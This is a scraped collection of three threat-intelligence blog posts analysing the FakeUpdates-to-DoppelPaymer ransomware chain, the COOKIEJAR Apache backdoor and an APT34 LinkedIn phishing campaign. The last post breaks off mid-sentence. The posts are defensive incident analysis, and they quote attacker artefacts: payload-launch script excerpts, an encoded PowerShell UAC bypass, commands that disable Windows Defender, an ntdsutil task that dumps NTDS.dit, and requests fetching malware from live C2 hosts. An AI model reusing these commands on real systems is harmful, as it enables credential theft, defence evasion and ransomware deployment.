                "text": "Within the past several months, FireEye has observed financially-motivated threat actors employ tactics that focus on disrupting business processes by deploying ransomware in mass throughout a victim’s environment. Understanding that normal business processes are critical to organizational success, these ransomware campaigns have been accompanied with multi-million dollar ransom amounts. In this post, we’ll provide a technical examination of one recent campaign that stems back to a technique that we initially reported on in April 2018 . Between May and September 2019, FireEye responded to multiple incidents involving a financially-motivated threat actor who leveraged compromised web infrastructure to establish an initial foothold in victim environments. This activity bared consistencies with a fake browser update campaign first identified in April 2018 – now tracked by FireEye as FakeUpdates . In this newer campaign, the threat actors leveraged victim systems to deploy malware such as Dridex or NetSupport , and multiple post-exploitation frameworks. The threat actors’ ultimate goal in some cases was to ransom systems in mass with BitPaymer or DoppelPaymer ransomware (see Figure 1). Figure 1: Recent FakeUpdates infection chain Due to campaign proliferation, we have responded to this activity at both Mandiant Managed Defense customers and incident response investigations performed by Mandiant. Through Managed Defense network and host monitoring as well as Mandiant’s incident response findings, we observed the routes the threat actor took, the extent of the breaches, and exposure of their various toolkits. Knock, Knock: FakeUpdates are Back! In April 2018, FireEye identified a campaign that used compromised websites to deliver heavily obfuscated Trojan droppers masquerading as Chrome, Internet Explorer, Opera, and/or Firefox browser updates. The compromised sites contained code injected directly into the HTML or in JavaScript components rendered by the pages which had been injected. These sites were accessed by victim users either via HTTP redirects or watering-hole techniques utilized by the attackers. Since our April 2018 blog post , this campaign has been refined to include new techniques and the use of post-exploitation toolkits. Recent investigations have shown threat actor activity that included internal reconnaissance, credential harvesting, privilege escalation, lateral movement, and ransomware deployment in enterprise networks. FireEye has identified that a large number of the compromised sites serving up the first stage of FakeUpdates have been older, vulnerable Content Management System (CMS) applications. You Are Using an Older Version…of our Malware The FakeUpdates campaign begins with a rather intricate sequence of browser validation, performed before the final payload is downloaded. Injected code on the initial compromised page will make the user’s browser transparently navigate to a malicious website using hard-coded parameters. After victim browser information is gleaned, additional redirects are performed and the user is prompted to download a fake browser update. FireEye has observed that the browser validation sequence may have additional protections to evade sandbox detections and post-incident triage attempts on the compromise site(s). Figure 2: Example of FakeUpdate landing page after HTTP redirects The redirect process used numerous subdomains, with a limited number of IP addresses. The malicious subdomains are often changed in different parts of the initial redirects and browser validation stages. After clicking the ‘Update’ button, we observed the downloading of one of three types of files: Heavily-obfuscated HTML applications (.hta file extensions) JavaScript files (.js file extensions) ZIP-compressed JavaScript files (.zip extensions) Figure 3 provides a snippet of JavaScript that provides the initial download functionality. var domain = '//gnf6.ruscacademy[.]in/'; var statisticsRequest = 'wordpress/news.php?b=612626&m=ad2219689502f09c225b3ca0bfd8e333&y=206'; var statTypeParamName = 'st'; … var filename = 'download.hta'; var browser = 'Chrome'; var special = '1'; var filePlain = window.atob(file64); var a = document.getElementById('buttonDownload'); Figure 3: Excerpts of JavaScript code identified from the FakeUpdates landing pages When the user opens the initial FakeUpdates downloader, the Windows Scripting Host ( wscript.exe) is executed and the following actions are performed: A script is executed in memory and used to fingerprint the affected system. A subsequent backdoor or banking trojan is downloaded if the system is successfully fingerprinted. A script is executed in memory which: Downloads and launches a third party screenshot utility. Sends the captured screenshots to an attacker. The payload delivered in step 2 is subsequently executed by the script process. The backdoor and banking-trojan payloads described above have been identified as Dridex, NetSupport Manager RAT, AZOrult, and Chthonic malware. The strategy behind the selective payload delivery is unclear; however, the most prevalent malware delivered during this phase of the infection chain were variants of the Dridex backdoor. FakeUpdates: More like FakeHTTP After the end user executes the FakeUpdates download, the victim system will send a custom HTTP POST request to a hard-coded Command and Control (C2) server. The POST request, depicted in Figure 4, showed that the threat actors used a custom HTTP request for initial callback. The Age HTTP header, for example, was set to a string of 16 seemingly-random lowercase hexadecimal characters. Figure 4: Initial HTTP communication after successful execution of the FakeUpdates dropper The HTTP Age header typically represents the time in seconds since an object has been cached by a proxy. In this case, via analysis of the obfuscated code on disk, FireEye identified that the Age header correlates to a scripted “auth header” parameter; likely used by the C2 server to validate the request. The first HTTP POST request also contains an XOR-encoded HTTP payload variable “ a=” . The C2 server responds to the initial HTTP request with encoded JavaScript. When the code is decoded and subsequently executed, system and user information is collected using wscript.exe. The information collected from the victim system included: The malicious script that initialized the callback System hostname Current user account Active Directory domain Hardware details, such as manufacturer Anti-virus software details Running processes This activity is nearly identical to the steps observed in our April 2018 post, indicating only minor changes in data collection during this stage. For example, in the earlier iteration of this campaign, we did not observe the collection of the script responsible for the C2 communication. Following the system information gathering, the data is subsequently XOR-encoded and sent via another custom HTTP POST request request to the same C2 server, with the data included in the parameter “b=” . Figure 5 provides a snippet of sample of the second HTTP request. Figure 5: Second HTTP POST request after successful system information gathering Figure 6 provides a copy of the decoded content, showing the various data points the malware transmitted back to the C2 server. 0=500 1=C:\\Users\\User\\AppData\\Local\\Temp\\Chrome.js 2=AMD64 3=SYSTEM1 4=User 5=4 6=Windows_NT 7=DOMAIN 8=HP 9=HP EliteDesk 10=BIOS_VERSION 11=Windows Defender|Vendor Anti-Virus 12=Vendor Anti-Virus|Windows Defender| 13=00:00:00:00:00:00 14=Enhanced (101- or 102-key) 15=USB Input Device 16=1024x768 17=System Idle Process|System|smss.exe|csrss.exe|wininit.exe|csrss.exe| winlogon.exe|services.exe|lsass.exe|svchost.exe|svchost.exe|svchost.exe|svchost.exe|svchost.exe| svchost.exe|spoolsv.exe|svchost.exe|svchost.exe|HPLaserJetService.exe|conhost.exe… Figure 6: Decoded system information gathered by the FakeUpdates malware After receiving the system information, the C2 server responds with an encoded payload delivered via chunked transfer-encoding to the infected system. This technique evades conventional IDS/IPS appliances, allowing for the second-stage payload to successfully download. During our investigations and FireEye Intelligence’s monitoring, we recovered encoded payloads that delivered one of the following: Dridex (Figure 7) NetSupport Manage Remote Access Tools (RATs) (Figure 8) Chthonic or AZORult (Figure 9) function runFile() { var lastException = ''; try { var wsh = new ActiveXObject(\"WScript.Shell\"); wsh.Run('cmd /C rename \"' + _tempFilePathSave + '\" \"' + execFileName + '\"'); WScript.Sleep(3 * 1000); runFileResult = wsh.Run('\"' + _tempFilePathExec + '\"'); lastException = ''; } catch (error) { lastException = error.number; runFileExeption += 'error number:' + error.number + ' message:' + error.message; } } Figure 7: Code excerpt observed in FakeUpdates used to launch Dridex payloads function runFile() { var lastException = ''; try { var wsh = new ActiveXObject(\"WScript.Shell\"); runFileResult = wsh.Run('\"' + _tempFilePathExec + '\" /verysilent'); lastException = ''; } catch (error) { lastException = error.number; runFileExeption += 'error number:' + error.number + ' message:' + error.message; } } Figure 8: Code excerpt observed in FakeUpdates used to launch NetSupport payloads function runFile() { var lastException = ''; try { var wsh = new ActiveXObject(\"WScript.Shell\"); runFileResult = wsh.Run('\"' + _tempFilePathExec + '\"'); lastException = ''; } catch (error) { lastException = error.number; runFileExeption += 'error number:' + error.number + ' message:' + error.message; } } Figure 9: Code excerpt observed in FakeUpdates used to launch Chthonic and AZORult payloads During this process, the victim system downloads and executes nircmdc.exe, a utility specifically used during the infection process to save two system screenshots. Figure 10 provides an example command used to capture the desktop screenshots. \"C:\\Users\\User\\AppData\\Local\\Temp\\nircmdc.exe\" savescreenshot \"C:\\Users\\User\\AppData\\Local\\Temp\\6206a2e3dc14a3d91.png\" Figure 10: Sample command used to executed the Nircmd tool to take desktop screenshots The PNG screenshots of the infected systems are then transferred to the C2 server, after which they are deleted from the system. Figure 11 provides an example of a HTTP POST request, again with the custom Age and User-Agent headers. Figure 11: Screenshots of the infected system are sent to an attacker-controlled C2 Interestingly, the screenshot file transfers were neither encoded nor obfuscated, as with other data elements transferred by the FakeUpdates malware. As soon as the screenshots are transferred, nircmdc.exe is deleted. All Hands on Deck In certain investigations, the incident was far from over. Following the distribution of Dridex v4 binaries (botnet IDs 199 and 501), new tools and frameworks began to appear. FireEye identified the threat actors leveraged their Dridex backdoor(s) to execute the publicly-available PowerShell Empire and/or Koadic post-exploitation frameworks. Managed Defense also identified the FakeUpdates to Dridex infection chain resulting in the download and execution of PoshC2, another publicly available tool. While it could be coincidental, it is worth noting that the use of PoshC2 was first observed in early September 2019 following the announcement that Empire would no longer be maintained and could represent a shift in attacker TTPs. These additional tools were often executed between 30 minutes and 2 hours after initial Dridex download. The pace of the initial phases of related attacks possibly suggests that automated post-compromise techniques are used in part before interactive operator activity occurs. We identified extensive usage of Empire and C2 communication to various servers during these investigations. For example, via process tracking, we identified a Dridex-injected explorer.exe executing malicious PowerShell: a clear sign of an Empire stager: Figure 12: An example of PowerShell Empire stager execution revealed during forensic analysis In the above example, the threat actors instructed the victim system to use the remote server 185.122.59[.]78 for command-and-control using an out-of-the-box Empire agent C2 configuration for TLS-encrypted backdoor communications. During their hands-on post-exploitation activity, the threat actors also moved laterally via PowerShell remoting and RDP sessions. FireEye identified the use of WMI to create remote PowerShell processes, subsequently used to execute Empire stagers on domain-joined systems. In one specific case, the time delta between initial Empire backdoor and successful lateral movement was under 15 minutes. Another primary goal for the threat actor was internal reconnaissance of both the local system and domain the computer was joined to. Figure 13 provides a snippet of Active Directory reconnaissance commands issued by the attacker during one of our investigations. Figure 13: Attacker executed commands The threat actors used an Empire module named SessionGopher and the venerable Mimikatz to harvest endpoint session and credential information. Finally, we also identified the attackers utilized Empire’s Invoke-EventVwrBypass, a Windows bypass technique used to launch executables using eventvwr.exe, as shown in Figure 14. \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoP -NonI -c $x=$((gp HKCU:Software\\Microsoft\\Windows Update).Update); powershell -NoP -NonI -W Hidden -enc $x Figure 14: PowerShell event viewer bypass Ransomware Attacks & Operator Tactics Within these investigations, FireEye identified the deployment BitPaymer or DoppelPaymer ransomware. While these ransomware variants are highly similar, DoppelPaymer uses additional obfuscation techniques. It also has enhanced capabilities, including an updated network discovery mechanism and the requirement of specific command-line execution. DoppelPaymer also uses a different encryption and padding scheme. The ransomware and additional reconnaissance tools were downloaded through public sharing website repositories such as DropMeFiles and SendSpace. Irrespective of the ransomware deployed, the attacker used the SysInternals utlity PSEXEC to distribute and execute the ransomware. Notably, in the DoppelPaymer incident, FireEye identified that Dridex v2 with the Botnet ID 12333 was downloaded onto the same system previously impacted by an instance of Dridex v4 with Botnet ID 501. Within days, this secondary Dridex instance was then used to enable the distribution of DoppelPaymer ransomware.  Prior to DoppelPaymer, the threat actor deleted volume shadow copies and disabled anti-virus and anti-malware protections on select systems. Event log artifacts revealed commands executed through PowerShell which were used to achieve this step (Figure 15): Event Log EID Message Microsoft-Windows-PowerShell%4Operational 600 HostApplication=powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true Microsoft-Windows-PowerShell%4Operational 600 HostApplication=powershell.exe Uninstall-WindowsFeature -Name Windows-Defender Application 1034 Windows Installer removed the product. Product Name: McAfee Agent-++-5.06.0011-++-1033-++-1603-++-McAfee, Inc.-++-(NULL)-++--++-. Product Version: 82. Figure 15: Event log entries related to the uninstallation of AV agents and disablement of real-time monitoring The DoppelPaymer ransomware was found in an Alternate Data Stream (ADS) in randomly named files on disk. ADSs are attributes within NTFS that allow for a file to have multiple data streams, with only the primary being visible in tools such as Windows Explorer. After ransomware execution, files are indicated as encrypted by being renamed with a “.locked” file extension. In addition to each “.locked” file, there is a ransom note with the file name “readme2unlock.txt” which provides instructions on how to decrypt files. Figure 16: DoppelPaymer ransomware note observed observed during a Mandiant Incident Response investigation Ransomware? Not In My House! Over the past few years, we have seen ransomware graduate from a nuisance malware to one being used to extort victim networks out of significant sums of money. Furthermore, threat actors are now coupling ransomware with multiple toolkits or other malware families to gain stronger footholds into an environment. In this blog post alone, we witnessed a threat actor move through multiple toolsets - some automated, some manual - with the ultimate goal of holding the victim organization hostage. Ransomware also raises the stakes for unprepared organizations as it levels the playing field for all areas of your enterprise. Ransomware proves that threat actors don’t need to get access to the most sensitive parts of your organization – they need to get access to the ones that will disrupt business processes. This widens your attack surface, but luckily, also gives you more opportunity for detection and response. Mandiant recently published an in depth white paper on Ransomware Protection and Containment Strategies , which may help organizations mitigate the risk of ransomware events. Indicators The following indicator set is a collective representation of artifacts identified during investigations into multiple customer compromises. Type Indicator(s) FakeUpdates Files 0e470395b2de61f6d975c92dea899b4f 7503da20d1f83ec2ef2382ac13e238a8 102ae3b46ddcb3d1d947d4f56c9bf88c aaca5e8e163503ff5fadb764433f8abb 2c444002be9847e38ec0da861f3a702b 62eaef72d9492a8c8d6112f250c7c4f2 175dcf0bd1674478fb7d82887a373174 10eefc485a42fac3b928f960a98dc451 a2ac7b9c0a049ceecc1f17022f16fdc6 FakeUpdates Domains & IP Addresses <8-Characters>.green.mattingsolutions[.]co <8-Characters>.www2.haciendarealhoa[.]com <8-Characters>.user3.altcoinfan[.]com 93.95.100[.]178 130.0.233[.]178 185.243.115[.]84 gnf6.ruscacademy[.]in backup.awarfaregaming[.]com click.clickanalytics208[.]com track.amishbrand[.]com track.positiverefreshment[.]org link.easycounter210[.]com nircmdc.exe 8136d84d47cb62b4a4fe1f48eb64166e Dridex 7239da273d3a3bfd8d169119670bb745 72fe19810a9089cd1ec3ac5ddda22d3f 07b0ce2dd0370392eedb0fc161c99dc7 c8bb08283e55aed151417a9ad1bc7ad9 6e05e84c7a993880409d7a0324c10e74 63d4834f453ffd63336f0851a9d4c632 0ef5c94779cd7861b5e872cd5e922311 Empire C2 185.122.59[.]78 109.94.110[.]136 Detecting the Techniques FireEye detects this activity across our platforms, including named detections for Dridex, Empire, BitPaymer and DoppelPaymer Ransomware. As a result of these investigations, FireEye additionally deployed new indicators and signatures to Endpoint and Network Security appliances.  This table contains several specific detection names from a larger list of detections that were available prior to this activity occurring. Platform Signature Name Endpoint Security HX Exploit Detection Empire RAT (BACKDOOR) EVENTVWR PARENT PROCESS (METHODOLOGY) Dridex (BACKDOOR) Dridex A (BACKDOOR) POWERSHELL SSL VERIFICATION DISABLE (METHODOLOGY) SUSPICIOUS POWERSHELL USAGE (METHODOLOGY) FAKEUPDATES SCREENSHOT CAPTURE (METHODOLOGY) Network Security Backdoor.FAKEUPDATES Trojan.Downloader.FakeUpdate Exploit.Kit.FakeUpdate Trojan.SSLCert.SocGholish MITRE ATT&CK Technique Mapping ATT&CK Techniques Initial Access Drive-by Compromise (T1189), Exploit Public-Facing Application (T1190) Execution PowerShell (T1086), Scripting (T1064), User Execution (T1204), Windows Management Instrumentation (T1047) Persistence DLL Search Order Hijacking (T1038) Privilege Escalation Bypass User Account Control (T1088), DLL Search Order Hijacking (T1038) Defense Evasion Bypass User Account Control (T1088), Disabling Security Tools (T1089), DLL Search Order Hijacking (T1038), File Deletion (T1107), Masquerading (T1036), NTFS File Attributes (T1096), Obfuscated Files or Information (T1027), Scripting (T1064), Virtualization/Sandbox Evasion (T1497) Credential Access Credential Dumping (T1003) Discovery Account Discovery (T1087), Domain Trust Discovery (T1482), File and Directory Discovery (T1083), Network Share Discovery (T1135), Process Discovery (T1057), Remote System Discovery (T1018), Security Software Discovery (T1063), System Information Discovery (T1082), System Network Configuration Discovery (T1016), Virtualization/Sandbox Evasion (T1497) Lateral Movement Remote Desktop Protocol (T1076),  Remote File Copy (T1105) Collection Data from Local System (T1005), Screen Capture (T1113) Command And Control Commonly Used Port (T1436), Custom Command and Control Protocol (T1094) ,Data Encoding (T1132), Data Obfuscation (T1001), Remote Access Tools (T1219), Remote File Copy (T1105), Standard Application Layer Protocol (T1071) Exfiltration Automated Exfiltration (T1020), Exfiltration Over Command and Control Channel (T1041) Impact Data Encrypted for Impact (T1486), Inhibit System Recovery (T1490), Service Stop (T1489) Acknowledgements A huge thanks to James Wyke and Jeremy Kennelly for their analysis of this activity and support of this post. Catch an on-demand recap on this and the Top 5 Managed Defense attacks this year. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/08/cookiejar-tracking-adversaries-with-fireeye-endpoint-security-module.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-08-11",
                    "source": "www.fireeye.com"
                },
                "text": "During a recent investigation at a telecommunications company led by Mandiant Managed Defense , our team was tasked with rapidly identifying systems that had been accessed by a threat actor using legitimate, but compromised domain credentials. This sometimes-challenging task was made simple because the customer had enabled the Logon Tracker module within their FireEye Endpoint Security product. Logon Tracker is an Endpoint Security Innovation Architecture module designed to simplify the investigation of lateral movement within Windows enterprise environments. Logon Tracker improves the efficiency of investigating lateral movement by aggregating historical logon activity and provides a mechanism to monitor for new activity. This data is presented in a user interface designed for analyzing investigative leads (e.g., a compromised account) and hunting for suspicious activity (e.g., RDP activity by privileged accounts). Logon Tracker also provides a graph interface that enables the identification of irregular and unique logons with the option to filter on hostnames, usernames, protocol, time of day, process name, privilege level, status (success/failure), and more. Figure 1: Logon Tracker GUI interface A critical component of a successful incident response is the scoping effort to identify systems that may have been accessed by the adversary. Windows Event Logs offer a commonly utilized method of identifying an adversary’s lateral movement between Windows systems. However, as with all log sources, Windows Event Logs are subject to data retention limits on endpoints, making the aggregated logon activity provided by Logon Tracker a critical source of evidence for incident response. Logon Tracker’s graphical display along with the raw logon events allowed Mandiant Managed Defense to quickly identify 10 potentially compromised hosts and begin to create a timeline of adversary activity. Managed Defense also leveraged Logon Tracker to monitor for additional suspicious logons and adversary activity throughout the incident response. Searching for logons (both failed and successful) from known compromised accounts and activity originating from compromised systems allowed our investigators to quickly determine which systems should be prioritized for analysis. Additionally, Logon Tracker provides investigators the ability to: Filter logon data for activity originating from user-provided IP ranges Search for logon data for activity by specific privileged accounts, including “Domain Administrators” and “Enterprise Administrators” Search for any privileged logon using the “Privileged” logon type Provide alerting and definition of custom rules (coming soon!) Case Background In mid-July, the Managed Defense Security Operations Center identified potential credential harvesting activity on a Windows server. The activity included the creation of a scheduled task configured to execute the built-in Windows utility, NTDSUTIL to take a snapshot of the active NTDS.dit file and save it locally to a text file as shown in Figure 2: \"schtasks  /s <redacted> /create /tn ntbackup /tr \\\"ntdsutil snapshot \\\\\\\"activate instance ntds\\\\\\\" create quit quit >c:\\\\Users\\\\admin\\\\AppData\\\\Local\\\\Temp\\\\ntds.log\\\" /sc once /st 05:38:00 /sd 07-12-2020 /f Figure 2: Scheduled task creation for NTDS.DIT harvesting The NTDS.dit file is a database that contains Active Directory data such as user objects, group memberships, groups, and—more useful to an adversary—password hashes for all users in the domain. Leveraging Logon Tracker and simple timeline analysis, Managed Defense quickly determined an adversary had accessed this system to create a scheduled task from a system with a hostname that did not match the naming convention used within the environment. An anonymized example of Logon Tracker data is shown in Figure 3: Figure 3: Logon Tracker data Armed with the suspicious hostname and potentially compromised username, Managed Defense then used Logon Tracker’s search functionality to determine the scope of systems potentially accessed by the adversary. The resulting investigation revealed that an Internet-facing Customer Relationship Management (CRM) application hosted on a Linux Apache web server had been compromised. Multiple web shells had been placed within web-accessible folders, allowing an adversary to execute arbitrary commands on the server. The adversary leveraged one of these web shells to install a malicious Apache module and restart Apache for the module to take effect. Mandiant has classified this module as COOKIEJAR (see the Malware Appendix at the end of the post for more details). The COOKIEJAR module enabled the adversary to proxy through the compromised server to any arbitrary IP/port pair within the customer’s internal network, see Figure 4. Figure 4: PCAP data Using this proxied access to the customer’s network, the adversary leveraged previously compromised domain credentials to connect to multiple Windows servers using SMB. Due to the use of the proxy to connect into the customer’s network, the hostname of the adversary’s workstation being used to conduct the attack was also passed into the logon events. This type of activity occurs due to the direct connection to the customers network and is similar to being on the same LAN. The non-standard hostname and non-standard customer naming convention used by the adversary help make scoping an easy task. Additionally, Managed Defense was able to leverage network detection to alert on the authentication attempts and activities of the adversary’s host. Malware Appendix During the course of the response, Mandiant identified a customized malicious Apache plugin capable of intercepting HTTP requests to an Apache HTTP server. The new malware family COOKIEJAR was created to aid in clustering and tracking this activity. The COOKIEJAR module installs a pre-connection hook that only runs if the client IP address matches a specified hardcoded adversary-controlled IP address. It listens for SSL/TLS connections on the port specified by the Apache server, using a certificate and private key loaded from /tmp/cacert.pem and /tmp/privkey.pem respectively. If the client IP address matches the hardcoded IP address (Figure 4), the backdoor accepts three commands based on the start of the URL: /phpconf_t/: Simply writes <html><h1>accepted.</h1></html> as the response. Likely used to test if the server is infected with the malware. /phpconf_s/: Executes commands on the server. Any communications to and from the system are forwarded to a shell, and are AES-256-ECB encrypted and then Base58 encoded. /phpconf_p/: Decode the second encoded string provided as a hostname/port (the first is ignored), using Base58 and AES-256-ECB (same key as before). The server will connect to the remote host and act as a proxy for the command and control (C2). Data to and from the C2 is encoded using Base58 and AES-256-ECB. Data to and from the remote host is not encoded. Figure 5: Hardcoded configuration data within COOKIEJAR Detecting the Techniques Product Signature Network Security/MVX APT.Backdoor.Linux64_COOKIEJAR_1 APT.Backdoor.Linux_COOKIEJAR_1 APT.Backdoor.Linux.COOKIEJAR Acknowledgements Chris Gardner, Malware Analyst Fred House, Director, Engineering More information on FireEye Endpoint Security's Logon Tracker Module including the module download and user manual are available in the FireEye Marketplace . Learn more about Mandiant Managed Defense , and catch an on-demand recap on this and the Top 5 Managed Defense attacks this year. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2019/07/hard-pass-declining-apt34-invite-to-join-their-professional-network.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2019-07-18",
                    "source": "www.fireeye.com"
                },
                "text": "Background With increasing geopolitical tensions in the Middle East, we expect Iran to significantly increase the volume and scope of its cyber espionage campaigns. Iran has a critical need for strategic intelligence and is likely to fill this gap by conducting espionage against decision makers and key organizations that may have information that furthers Iran's economic and national security goals. The identification of new malware and the creation of additional infrastructure to enable such campaigns highlights the increased tempo of these operations in support of Iranian interests. FireEye Identifies Phishing Campaign In late June 2019, FireEye identified a phishing campaign conducted by APT34, an Iranian-nexus threat actor. Three key attributes caught our eye with this particular campaign: Masquerading as a member of Cambridge University to gain victims’ trust to open malicious documents, The usage of LinkedIn to deliver malicious documents, The addition of three new malware families to APT34’s arsenal. FireEye’s platform successfully thwarted this attempted intrusion, stopping a new malware variant dead in its tracks. Additionally, with the assistance of our FireEye Labs Advanced Reverse Engineering (FLARE), Intelligence, and Advanced Practices teams, we identified three new malware families and a reappearance of PICKPOCKET, malware exclusively observed in use by APT34. The new malware families, which we will examine later in this post, show APT34 relying on their PowerShell development capabilities, as well as trying their hand at Golang. APT34 is an Iran-nexus cluster of cyber espionage activity that has been active since at least 2014. They use a mix of public and non-public tools to collect strategic information that would benefit nation-state interests pertaining to geopolitical and economic needs. APT34 aligns with elements of activity reported as OilRig and Greenbug, by various security researchers. This threat group has conducted broad targeting across a variety of industries operating in the Middle East; however, we believe APT34's strongest interest is gaining access to financial, energy, and government entities. Additional research on APT34 can be found in this FireEye blog post , this CERT-OPMD post , and this Cisco post . Mandiant Managed Defense also initiated a Community Protection Event (CPE) titled “Geopolitical Spotlight: Iran.” This CPE was created to ensure our customers are updated with new discoveries, activity and detection efforts related to this campaign, along with other recent activity from Iranian-nexus threat actors to include APT33, which is mentioned in this updated FireEye blog post . Industries Targeted The activities observed by Managed Defense, and described in this post, were primarily targeting the following industries: Energy and Utilities Government Oil and Gas Utilizing Cambridge University to Establish Trust On June 19, 2019, Mandiant Managed Defense Security Operations Center received an exploit detection alert on one of our FireEye Endpoint Security appliances. The offending application was identified as Microsoft Excel and was stopped immediately by FireEye Endpoint Security’s ExploitGuard engine. ExploitGuard is our behavioral monitoring, detection, and prevention capability that monitors application behavior, looking for various anomalies that threat actors use to subvert traditional detection mechanisms. Offending applications can subsequently be sandboxed or terminated, preventing an exploit from reaching its next programmed step. The Managed Defense SOC analyzed the alert and identified a malicious file named System.doc (MD5: b338baa673ac007d7af54075ea69660b) , located in C:\\Users\\<user_name>\\.templates . The file System.doc is a Windows Portable Executable (PE), despite having a \"doc\" file extension. FireEye identified this new malware family as TONEDEAF. A backdoor that communicates with a single command and control (C2) server using HTTP GET and POST requests, TONEDEAF supports collecting system information, uploading and downloading of files, and arbitrary shell command execution. When executed, this variant of TONEDEAF wrote encrypted data to two temporary files – temp.txt and temp2.txt – within the same directory of its execution. We explore additional technical details of TONEDEAF in the malware appendix of this post. Retracing the steps preceding exploit detection, FireEye identified that System.doc was dropped by a file named ERFT-Details.xls . Combining endpoint- and network-visibility, we were able to correlate that ERFT-Details.xls originated from the URL http://www.cam-research-ac[.]com/Documents/ERFT-Details.xls . Network evidence also showed the access of a LinkedIn message directly preceding the spreadsheet download. Managed Defense reached out to the impacted customer’s security team, who confirmed the file was received via a LinkedIn message. The targeted employee conversed with \"Rebecca Watts\", allegedly employed as \"Research Staff at University of Cambridge\". The conversation with Ms. Watts, provided in Figure 1, began with the solicitation of resumes for potential job opportunities. Figure 1: Screenshot of LinkedIn message asking to download TONEDEAF This is not the first time we’ve seen APT34 utilize academia and/or job offer conversations in their various campaigns. These conversations often take place on social media platforms, which can be an effective delivery mechanism if a targeted organization is focusing heavily on e-mail defenses to prevent intrusions. FireEye examined the original file ERFT-Details.xls , which was observed with at least two unique MD5 file hashes: 96feed478c347d4b95a8224de26a1b2c caf418cbf6a9c4e93e79d4714d5d3b87 A snippet of the VBA code, provided in Figure 2, creates System.doc in the target directory from base64-encoded text upon opening. Figure 2: Screenshot of VBA code from System.doc The spreadsheet also creates a scheduled task named \"windows update check\" that runs the file C:\\Users\\<user_name>\\.templates\\System Manager.exe every minute. Upon closing the spreadsheet, a final VBA function will rename System.doc to System Manager.exe . Figure 3 provides a snippet of VBA code that creates the scheduled task, clearly obfuscated to avoid simple detection. Figure 3: Additional VBA code from System.doc Upon first execution of TONEDEAF, FireEye identified a callback to the C2 server offlineearthquake[.]com over port 80. The FireEye Footprint: Pivots and Victim Identification After identifying the usage of offlineearthquake[.]com as a potential C2 domain, FireEye’s Intelligence and Advanced Practices teams performed a wider search across our global visibility. FireEye’s Advanced Practices and Intelligence teams were able to identify additional artifacts and activity from the APT34 actors at other victim organizations. Of note, FireEye discovered two additional new malware families hosted at this domain, VALUEVAULT and LONGWATCH. We also identified a variant of PICKPOCKET, a browser credential-theft tool FireEye has been tracking since May 2018, hosted on the C2. Requests to the domain offlineearthquake[.]com could take multiple forms, depending on the malware’s stage of installation and purpose. Additionally, during installation, the malware retrieves the system and current user names, which are used to create a three-character “sys_id”. This value is used in subsequent requests, likely to track infected target activity. URLs were observed with the following structures: hxxp[://]offlineearthquake[.]com/download?id=<sys_id>&n=000 hxxp[://]offlineearthquake[.]com/upload?id=<sys_id>&n=000 hxxp[://]offlineearthquake[.]com/file/<sys_id>/<executable>?id=<cmd_id>&h=000 hxxp[://]offlineearthquake[.]com/file/<sys_id>/<executable>?id=<cmd_id>&n=000 The first executable identified by FireEye on the C2 was WinNTProgram.exe (MD5: 021a0f57fe09116a43c27e5133a57a0a) , identified by FireEye as LONGWATCH. LONGWATCH is a keylogger that outputs keystrokes to a log.txt file in the Window’s temp folder. Further information regarding LONGWATCH is detailed in the Malware Appendix section at the end of the post. FireEye Network Security appliances also detected the following being retrieved from APT34 infrastructure (Figure 4). GET hxxp://offlineearthquake.com/file/<sys_id>/b.exe?id=<3char_redacted>&n=000 User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) AppleWebKit/537.36 (KHTML, like Gecko) Host: offlineearthquake[.]com Proxy-Connection: Keep-Alive Pragma: no-cache HTTP/1.1 Figure 4: Snippet of HTTP traffic retrieving VALUEVAULT; detected by FireEye Network Security appliance FireEye identifies b.exe (MD5: 9fff498b78d9498b33e08b892148135f) as VALUEVAULT. VALUEVAULT is a Golang compiled version of the \"Windows Vault Password Dumper\" browser credential theft tool from Massimiliano Montoro, the developer of Cain & Abel. VALUEVAULT maintains the same functionality as the original tool by allowing the operator to extract and view the credentials stored in the Windows Vault. Additionally, VALUEVAULT will call Windows PowerShell to extract browser history in order to match browser passwords with visited sites. Further information regarding VALUEVAULT can be found in the appendix below. Further pivoting from FireEye appliances and internal data sources yielded two additional files, PE86.dll (MD5: d8abe843db508048b4d4db748f92a103) and PE64.dll (MD5: 6eca9c2b7cf12c247032aae28419319e) . These files were analyzed and determined to be 64- and 32-bit variants of the malware PICKPOCKET, respectively. PICKPOCKET is a credential theft tool that dumps the user's website login credentials from Chrome, Firefox, and Internet Explorer to a file. This tool was previously observed during a Mandiant incident response in 2018 and, to date, solely utilized by APT34. Conclusion The activity described in this blog post presented a well-known Iranian threat actor utilizing their tried-and-true techniques to breach targeted organizations. Luckily, with FireEye’s platform in place, our Managed Defense customers were not impacted. Furthermore, upon the blocking of this activity, FireEye was able to expand upon the observed indicators to identify a broader campaign, as well as the use of new and old malware. We suspect this will not be the last time APT34 brings new tools to the table. Threat actors are often reshaping their TTPs to evade detection mechanisms, especially if the target is highly desired. For these reasons, we recommend organizations remain vigilant in their defenses, and remember to view their environment holistically when it comes to information security. Learn more about Mandiant Managed Defense , and catch an on-demand recap on this and the Top 5 Managed Defense attacks this year. Malware Appendix TONEDEAF TONEDEAF is a backdoor that communicates with Command and Control servers using HTTP or DNS. Supported commands include system information collection, file upload, file download, and arbitrary shell command execution. Although this backdoor was coded to be able to communicate with DNS requests to the hard-coded Command and Control server, c[.]cdn-edge-akamai[.]com, it was not configured to use this functionality. Figure 5 provides a snippet of the assembly CALL instruction of dns_exfil. The creator likely made this as a means for future DNS exfiltration as a plan B. Figure 5: Snippet of code from TONEDEAF binary Aside from not being enabled in this sample, the DNS tunneling functionality also contains missing values and bugs that prevent it from executing properly. One such bug involves determining the length of a command response string without accounting for Unicode strings. As a result, a single command response byte is sent when, for example, the malware executes a shell command that returns Unicode output. Additionally, within the malware, an unused string contained the address 185[.]15[.]247[.]154. VALUEVAULT VALUEVAULT is a Golang compiled version of the “Windows Vault Password Dumper” browser credential theft tool from Massimiliano Montoro, the developer of Cain & Abel. VALUEVAULT maintains the same functionality as the original tool by allowing the operator to extract and view the credentials stored in the Windows Vault. Additionally, 